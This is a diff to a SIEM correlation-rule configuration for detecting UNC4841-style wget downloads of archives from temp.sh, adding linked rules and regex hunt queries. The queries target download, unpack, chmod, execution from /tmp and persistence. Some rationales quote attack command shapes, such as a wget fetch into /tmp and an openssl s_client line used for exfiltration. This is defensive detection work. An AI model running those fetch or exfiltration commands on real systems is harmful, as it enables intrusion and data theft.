@@ -154,19 +154,58 @@ graylog:
   query: data_process_exec_process_binary:/.*\/[Ww][Gg][Ee][Tt]/ AND data_process_exec_process_arguments:/.*[Hh][Tt][Tt][Pp][Ss]:\/\/[Tt][Ee][Mm][Pp]\.[Ss][Hh]\/.*/ AND (data_process_exec_process_arguments:/.*\.[Rr][Aa][Rr]/ OR data_process_exec_process_arguments:/.*\.[Zz][Ii][Pp]/)
 
 correlation:
-  # Authored by the correlation engine for review.
+  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
+  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
+  related_rules:
+  - id: f6a711f3-d032-4f9e-890b-bbe776236c84
+    name: UNC4841 - Potential SEASPY Execution
+    reason: The payload inside the archive this rule just pulled. UNC4841 staged the SEASPY backdoor (running as BarracudaMailService / resize2fstab / resize_reisertab) as a compressed drop; this rule is the fetch, SEASPY execution is the detonation of the archive's contents - the single strongest confirmation the temp.sh download was a backdoor install, not a benign pull. Same intrusion, literal next step.
+  - id: 23835beb-ec38-4e74-a5d4-b99af6684e91
+    name: UNC4841 - Download Tar File From Untrusted Direct IP Via Wget
+    reason: The same actor's other wget ingress method - a .tar pulled from a raw public IP with --no-check-certificate. UNC4841 staged payloads from both temp.sh and direct IPs on the same compromised ESG appliance, so the two wget fetches co-firing on one host corroborates a hands-on UNC4841 operator rather than a single odd download.
+  - id: 60911c07-f989-4362-84af-c609828ef829
+    name: UNC4841 - SSL Certificate Exfiltration Via Openssl
+    reason: The campaign's objective and C2 channel. Once the backdoor from this archive runs, UNC4841 used 'openssl s_client -quiet -connect <ip>:443|8080' to exfiltrate certificates and tunnel C2; its appearance on the same host closes the loop from ingress (this fetch) to the espionage goal and marks the intrusion as active hands-on-keyboard.
+  - id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+    name: Suspicious Download and Execute Pattern via Curl/Wget
+    reason: The generic download->stage->execute escalation of this very fetch. If the operator chained the temp.sh pull straight into 'sh -c' execution from /tmp or /dev/shm, this rule fires on the same wget invocation family - evidence the download was immediately weaponised rather than left on disk.
+  - id: cf610c15-ed71-46e1-bdf8-2bd1a99de6c4
+    name: Download File To Potentially Suspicious Directory Via Wget
+    reason: 'The same wget ingress caught by its output path: cf610c15 matches ''wget -O/--output-document'' writing into /tmp. A single ''wget -O /tmp/x.zip https://temp.sh/...zip'' trips both this rule and that one, so co-firing pins the archive''s on-disk staging location - exactly where to hunt the decompression next.'
+  - id: 6419afd1-3742-47a5-a7e6-b50386cd15f8
+    name: Chmod Targeting Sensitive Directories
+    reason: The make-executable step after the archive is unpacked. A .zip/.rar payload is inert until decompressed and chmod'd; a chmod against a file in /tmp (or /etc, /opt) right after this fetch is the clearest signal the dropped backdoor is being staged to run (T1222.002).
+  - id: 312b42b1-bded-4441-8b58-163a3af58775
+    name: Potentially Suspicious Execution From Tmp Folder
+    reason: 'The payoff: a binary whose own path is under /tmp/ executes - the decompressed ELF backdoor actually running. Turns ''a compressed archive was downloaded'' into ''its contents ran'', confirming the end-to-end download->unpack->execute chain completed on the host.'
+  - id: 6b14bac8-3e3a-4324-8109-42f0546a347f
+    name: Scheduled Cron Task/Job - Linux
+    reason: Persistence for the unpacked payload. UNC4841 backdoors survived reboots; crontab installing a job that references a file in /tmp - where the archive was unpacked - is a classic Linux persistence anchor established right after the backdoor first runs (T1053.003).
+  window: 2h
   enrichment_searches:
-  # Rule-specific telemetry pivots the engine runs around an alert from this rule,
-  # scoped to the alert's host/user/IP within the window (behaviour-targeted, not a sweep).
-    - name: "Shell / interpreter execution on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Zz][Ss][Hh]|\/[Kk][Ss][Hh]|\/[Aa][Ss][Hh]|\/[Bb][Uu][Ss][Yy][Bb][Oo][Xx])/) OR (data_process_exec_process_binary:/.*(\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll]|\/[Rr][Uu][Bb][Yy]|\/[Pp][Hh][Pp]|\/[Nn][Oo][Dd][Ee]|\/[Ll][Uu][Aa]|\/[Aa][Ww][Kk])/))'
-      pivot_on: [host]
-      window: 1h
-    - name: "Reconnaissance commands on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee][Cc][Tt][Ll]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp]|\/[Ww]|\/[Ww][Hh][Oo]|\/[Ll][Aa][Ss][Tt]|\/[Ll][Ss][Oo][Ff]|\/[Nn][Mm][Aa][Pp]|\/[Dd][Ii][Gg]|\/[Ff][Ii][Nn][Dd])/'
-      pivot_on: [host]
-      window: 1h
-    - name: "Privilege-escalation tooling executed on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ss][Uu][Dd][Oo]|\/[Ss][Uu]|\/[Pp][Kk][Ee][Xx][Ee][Cc]|\/[Dd][Oo][Aa][Ss]|\/[Ss][Ee][Tt][Cc][Aa][Pp]|\/[Cc][Hh][Ss][Hh]|\/[Nn][Ee][Ww][Gg][Rr][Pp])/'
-      pivot_on: [host]
-      window: 2h
+  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
+  - name: Archive decompression / extraction on this host (unpacking the downloaded .zip/.rar)
+    query: data_process_exec_process_binary:/.*(\/[Uu][Nn][Zz][Ii][Pp]|\/[Uu][Nn][Rr][Aa][Rr]|\/[Uu][Nn][Aa][Rr]|\/7[Zz]|\/7[Zz][Aa]|\/7[Zz][Rr]|\/[Tt][Aa][Rr]|\/[Gg][Uu][Nn][Zz][Ii][Pp]|\/[Gg][Zz][Ii][Pp]|\/[Bb][Uu][Nn][Zz][Ii][Pp]2|\/[Bb][Zz][Ii][Pp]2|\/[Uu][Nn][Xx][Zz]|\/[Xx][Zz]|\/[Zz][Cc][Aa][Tt])/
+    pivot_on:
+    - host
+    window: 1h
+  - name: Execute bit set via chmod on a file in a staging / home directory
+    query: data_process_exec_process_binary:/.*\/[Cc][Hh][Mm][Oo][Dd]/ AND (data_process_exec_process_arguments:/.*\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/ OR data_process_exec_process_arguments:/.*\/[Hh][Oo][Mm][Ee]\/.*/)
+    pivot_on:
+    - host
+    window: 1h
+  - name: Execution of a dropped binary or script from a staging directory (the payload runs)
+    query: data_process_exec_process_binary:/\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_binary:/\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_binary:/\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/ OR ((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll])/) AND (data_process_exec_process_arguments:/.*\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/))
+    pivot_on:
+    - host
+    window: 2h
+  - name: Persistence established on this host (cron / systemd / init.d / rc.local / shell profiles / authorized_keys)
+    query: (data_process_exec_process_binary:/.*(\/[Cc][Rr][Oo][Nn][Tt][Aa][Bb]|\/[Ss][Yy][Ss][Tt][Ee][Mm][Cc][Tt][Ll]|\/[Aa][Tt]|\/[Uu][Pp][Dd][Aa][Tt][Ee]-[Rr][Cc]\.[Dd])/) OR data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Cc][Rr][Oo][Nn].*/ OR data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ss][Yy][Ss][Tt][Ee][Mm][Dd]\/.*/ OR data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ii][Nn][Ii][Tt]\.[Dd]\/.*/ OR data_process_exec_process_arguments:/.*[Rr][Cc]\.[Ll][Oo][Cc][Aa][Ll].*/ OR data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh][Rr][Cc].*/ OR data_process_exec_process_arguments:/.*[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Ee][Dd]_[Kk][Ee][Yy][Ss].*/
+    pivot_on:
+    - host
+    window: 4h
+  - name: Further ingress of compressed stages via download tooling (more temp.sh-style pulls)
+    query: (data_process_exec_process_binary:/.*(\/[Ww][Gg][Ee][Tt]|\/[Cc][Uu][Rr][Ll]|\/[Tt][Ff][Tt][Pp]|\/[Ff][Tt][Pp]|\/[Ss][Cc][Pp])/) AND (data_process_exec_process_arguments:/.*\.[Zz][Ii][Pp].*/ OR data_process_exec_process_arguments:/.*\.[Rr][Aa][Rr].*/ OR data_process_exec_process_arguments:/.*\.[Tt][Aa][Rr].*/ OR data_process_exec_process_arguments:/.*\.[Gg][Zz].*/ OR data_process_exec_process_arguments:/.*\.[Tt][Gg][Zz].*/ OR data_process_exec_process_arguments:/.*\.7[Zz].*/)
+    pivot_on:
+    - host
+    window: 2h
